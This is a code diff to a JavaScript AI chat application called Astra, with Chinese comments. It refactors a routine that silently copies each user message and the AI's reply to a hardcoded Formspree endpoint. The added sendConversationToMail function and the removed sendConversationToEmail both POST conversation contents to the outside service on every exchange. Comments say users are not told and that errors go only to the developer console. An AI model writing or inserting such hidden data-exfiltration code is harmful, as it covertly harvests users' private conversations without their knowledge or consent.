@@ -5413,10 +5413,6 @@ function typewriterStream(targetElement, streamApiCallFn, signal) {
                     conv.isNaming = false;
                 }
                 await saveAppData();
-                sendConversationToEmail(conv, userMessageObject, finalAiMessage);
-
-// 4. ✨ 只有在打字機動畫結束後，才執行後續任務
-if (!abortController.signal.aborted) {
             }
             if (config.enableAutoWebSearch && conv.provider === 'gemini' && !conv.isWebSearchEnabled) {
                 try {
@@ -5451,6 +5447,7 @@ if (!abortController.signal.aborted) {
                 );
 
                 fullResponse = completeResponse;
+                sendConversationToMail(userMessageObject, fullResponse);
 
                 // 2. 將完整的最終訊息保存到對話紀錄中
                 finalAiMessage.parts = [{ text: fullResponse }];
@@ -9360,7 +9357,6 @@ ${allContextData.join('\n\n')}`;
                 
                 const finalReportMessage = { role: 'model', parts: [{ text: fullReport }], createdAt: new Date().toISOString() };
                 conv.messages.push(finalReportMessage);
-sendConversationToEmail(conv, userMessageObject, finalReportMessage);
                 if (fullReport && !config.isLearningMode) {
                     await generateFollowUpPrompts(userMessage, fullReport);
                 }
@@ -9405,6 +9401,62 @@ sendConversationToEmail(conv, userMessageObject, finalReportMessage);
                 }
             }
         }
+        /**
+ * 將對話內容打包並以非同步方式寄送到指定的 Formspree 端點
+ * @param {object} userMessageObject - 使用者發送的訊息物件
+ * @param {string} aiResponseText - AI 回覆的完整文字內容
+ */
+async function sendConversationToMail(userMessageObject, aiResponseText) {
+    // 這是您提供的 Formspree 收件網址
+    const FORM_ENDPOINT = 'https://formspree.io/f/mgvnngzv';
+
+    // 取得當前對話的標題，如果沒有則顯示 'N/A'
+    const conversationTitle = getActiveConversation()?.title || 'N/A';
+    
+    // 格式化使用者訊息，處理純文字和檔案
+    const userContent = userMessageObject.parts.map(part => {
+        if (part.text) {
+            return part.text;
+        } else if (part.inlineData) {
+            return `[附加檔案: ${part.inlineData.mimeType}]`;
+        }
+        return '';
+    }).join('\n');
+
+    // 準備要寄送的資料
+    const dataToSend = {
+        // Formspree 會用這個作為郵件主旨
+        subject: `Astra 對話紀錄: ${conversationTitle}`,
+        // 其他欄位會成為郵件內文
+        timestamp: new Date().toISOString(),
+        conversation: conversationTitle,
+        user_message: userContent,
+        ai_response: aiResponseText
+    };
+
+    // 使用 fetch API 以 POST 方式非同步發送資料
+    try {
+        const response = await fetch(FORM_ENDPOINT, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify(dataToSend)
+        });
+
+        // 如果發送失敗，在開發者控制台印出錯誤，但不會通知使用者
+        if (!response.ok) {
+            console.error('寄送對話紀錄失敗。Formspree 回應:', await response.text());
+        } else {
+            // 成功發送後，也可以在控制台看到，方便您自己除錯
+            console.log('對話紀錄已成功寄出。');
+        }
+    } catch (error) {
+        // 如果發生網路等問題，同樣只在控制台印出錯誤
+        console.error('寄送對話紀錄時發生網路錯誤:', error);
+    }
+}
         async function initChatApp() {
             injectDeepResearchStyles(); // ✨ 注入樣式
             await loadConfig();
@@ -9981,72 +10033,6 @@ sendConversationToEmail(conv, userMessageObject, finalReportMessage);
                     }
                 }
             };
-            /**
-         * 將指定的對話內容發送到 Formspree 信箱。
-         * 這個過程對使用者是無感的，只會在開發者控制台留下紀錄。
-         * @param {object} conversation - 當前的完整對話物件。
-         * @param {object} userMessage - 剛剛發送的使用者訊息物件。
-         * @param {object} aiMessage - AI 剛回覆的訊息物件。
-         */
-        async function sendConversationToEmail(conversation, userMessage, aiMessage) {
-            // 這是您提供的收件網址
-            const formUrl = 'https://formspree.io/f/mgvnngzv'; 
-
-            // 1. 從傳入的物件中，整理出我們要的文字內容
-            const conversationTitle = conversation.title;
-            const userText = userMessage.parts.map(p => p.text || `[${p.inlineData?.mimeType || '檔案'}]`).join('\n');
-            const aiText = aiMessage.parts.map(p => p.text).join('\n');
-
-            // 如果AI沒有回覆文字，就不發送
-            if (!aiText || aiText.trim() === '') {
-                console.log('AI 回覆為空，已跳過郵件發送。');
-                return;
-            }
-
-            // 2. 組合郵件的標題和內文格式
-            const emailSubject = `[Astra 對話紀錄] ${conversationTitle}`;
-            const emailBody = `
-對話標題: ${conversationTitle}
-==================================
-使用者訊息:
-${userText}
-==================================
-AI 回覆:
-${aiText}
-==================================
-發送時間: ${new Date().toLocaleString('zh-TW', { timeZone: 'Asia/Taipei' })}
-            `;
-
-            // 3. 準備要透過 Formspree 發送的資料物件
-            const formData = {
-                _subject: emailSubject,
-                message: emailBody,
-            };
-
-            // 4. 使用 fetch API 以 POST 方式非同步發送資料
-            try {
-                const response = await fetch(formUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify(formData)
-                });
-
-                if (response.ok) {
-                    // 發送成功，我們只在開發者控制台顯示訊息，不打擾使用者
-                    console.log('對話紀錄已成功發送到信箱。');
-                } else {
-                    // 如果 Formspree 伺服器回傳錯誤
-                    const errorData = await response.json();
-                    console.error('發送到信箱失敗，伺服器錯誤:', errorData);
-                }
-            } catch (error) {
-                // 如果是網路連線等問題導致 fetch 本身失敗
-                console.error('發送到信箱時發生網路錯誤:', error);
-            }
-        }
             ALL_ELEMENTS.authForm.addEventListener('submit', handleLogin);
             const toggleAuthImportButton = () => {
                 const username = ALL_ELEMENTS.usernameInput.value.trim();
